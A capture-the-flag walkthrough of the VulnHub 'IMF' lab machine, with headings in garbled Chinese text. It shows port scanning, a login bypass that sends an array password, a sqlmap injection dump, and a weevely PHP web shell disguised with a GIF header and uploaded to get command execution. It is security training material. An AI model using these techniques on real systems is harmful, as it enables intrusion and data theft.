# IMF
> https://download.vulnhub.com/imf/IMF.ova
é¶åœºIPï¼š`192.168.32.175`
![image-20220718170351516](../../.gitbook/assets/image-20220718170351516.png)
æ‰«æå¯¹å¤–ç«¯å£
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -p 1-65535 192.168.32.175                                                                                                                                                                                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 05:04 EDT
Nmap scan report for 192.168.32.175
Host is up (0.00028s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:69:7C:06 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 105.01 seconds
```
æµè§ˆå™¨è®¿é—®80ç«¯å£
![image-20220718170919899](../../.gitbook/assets/image-20220718170919899.png)
åœ¨contact.phpçš„æºä»£ç æ‰¾åˆ°flag
![image-20220718171300971](../../.gitbook/assets/image-20220718171300971.png)
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# echo "YWxsdGhlZmlsZXM=" | base64  -d                                                                                         
allthefiles                                                                                                                                                                                                                    
```
è¿˜æœ‰ä¸€ä¸ªåŠ å¯†å­—ç¬¦ä¸²
![image-20220718171611896](../../.gitbook/assets/image-20220718171611896.png)
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==" | base64  -d
flag2{aW1mYWRtaW5pc3RyYXRvcg==}                                                                                                                                                                                                                                             
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d
imfadministrator 
```
è®¿é—®`/allthefiles`ç›®å½•
![image-20220718171707015](../../.gitbook/assets/image-20220718171707015.png)
è®¿é—®`/imfadministrator`ç›®å½•
![image-20220718171733199](../../.gitbook/assets/image-20220718171733199.png)
æŸ¥çœ‹é¡µé¢æºä»£ç 
![image-20220718172009129](../../.gitbook/assets/image-20220718172009129.png)
ä¿®æ”¹æ•°æ®åŒ…
```
POST /imfadministrator/ HTTP/1.1
Host: 192.168.32.175
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://192.168.32.175
Connection: keep-alive
Referer: http://192.168.32.175/imfadministrator/
Cookie: PHPSESSID=ngh2u9s8em7p7tj8rbljpo8a61
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
user=rmichaels&pass[]=123
```
è·å–flag3
```
flag3{Y29udGludWVUT2Ntcw==}Welcome, rmichaelsIMF CMS
```
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# echo 'Y29udGludWVUT2Ntcw==' | base64 -d
continueTOcms    
```
è®¿é—®cms.php
![image-20220718173407484](../../.gitbook/assets/image-20220718173407484.png)
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# cat 1.txt 
GET /imfadministrator/cms.php?pagename=home HTTP/1.1
Host: 192.168.32.175
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.32.175/imfadministrator/cms.php
Cookie: PHPSESSID=ngh2u9s8em7p7tj8rbljpo8a61
Upgrade-Insecure-Requests: 1
```
ä½¿ç”¨sqlmapå»è·‘
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# sqlmap -r 1.txt -p pagename --level 5 --risk 3 --dbms=mysql -D admin -T pages --dump
Database: admin                                                                                                                                                                                                                             
Table: pages
[4 entries]
+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+
| id | pagedata                                                                                                                                                              | pagename             |
+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+
| 1  | Under Construction.                                                                                                                                                   | upload               |
| 2  | Welcome to the IMF Administration.                                                                                                                                    | home                 |
| 3  | Training classrooms available.  Contact us for training.                                                               | tutorials-incomplete |
| 4  | Disavowed List*************** ***************** ********-Secretary | disavowlist          |
+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+
```
æ‰¾åˆ°ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶
![image-20220718173528676](../../.gitbook/assets/image-20220718173528676.png)
æ‰«æäºŒç»´ç æ‰¾åˆ°`flag4{dXBsb2Fkcjk0Mi5waHA=}`
```
â”€(rootğŸ’€kali)-[/tmp]
â””â”€# echo 'dXBsb2Fkcjk0Mi5waHA=' | base64 -d                                                                                                                                                                                            
uploadr942.php        
```
![image-20220718173659333](../../.gitbook/assets/image-20220718173659333.png)
è¿›å…¥åï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªä¸Šä¼ é¡µé¢
![image-20220718173901920](../../.gitbook/assets/image-20220718173901920.png)
phpåç¼€ä¸èƒ½ä¸Šä¼ 
![image-20220718174134739](../../.gitbook/assets/image-20220718174134739.png)
æœ‰WAFè¿›è¡Œæ£€æµ‹
![image-20220718174207069](../../.gitbook/assets/image-20220718174207069.png)
ä½¿ç”¨weevelyç”Ÿæˆshell
```
â”€(rootğŸ’€kali)-[/tmp]
â””â”€# weevely generate 123456 shell.php
Generated 'shell.php' with password '123456' of 744 byte size.
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# mv shell.php shell.gif
```
åœ¨æ–‡ä»¶æœ€å‰é¢æ·»åŠ GIFå¤´
```
GIF89a3444
```
![image-20220718175020225](../../.gitbook/assets/image-20220718175020225.png)
![image-20220718175101551](../../.gitbook/assets/image-20220718175101551.png)
```
â”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# weevely http://192.168.32.175/imfadministrator/uploads/edb0327e464d.gif 123456
[+] weevely 4.0.1
[+] Target:     192.168.32.175
[+] Session:    /root/.weevely/sessions/192.168.32.175/edb0327e464d_0.session
[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.
weevely> ls
edb0327e464d.gif
flag5_abc123def.txt
www-data@imf:/var/www/html/imfadministrator/uploads $ 
```
æŸ¥çœ‹flag5
```
www-data@imf:/var/www/html/imfadministrator/uploads $ cat flag5_abc123def.txt
flag5{YWdlbnRzZXJ2aWNlcw==}
```
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# echo 'YWdlbnRzZXJ2aWNlcw==' | base64 -d
agentservices
```
æ‰¾åˆ°agentæœåŠ¡
```
www-data@imf:/var/www/html/imfadministrator/uploads $ find / -name "agent" &>/dev/null
/usr/local/bin/agent
/etc/xinetd.d/agent
```
è¿è¡Œagent
```
www-data@imf:/var/www/html/imfadministrator/uploads $ /usr/local/bin/agent
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System
Agent ID : 
```
åœ¨agentç›®å½•æ‰¾åˆ°ä¸€ä¸²ç«¯å£åˆ—è¡¨
```
www-data@imf:/var/www/html/imfadministrator/uploads $ cd /usr/local/bin
www-data@imf:/usr/local/bin $ ls
access_codes
agent
www-data@imf:/usr/local/bin $ cat acc*
SYN 7482,8279,9467
www-data@imf:/usr/local/bin $ 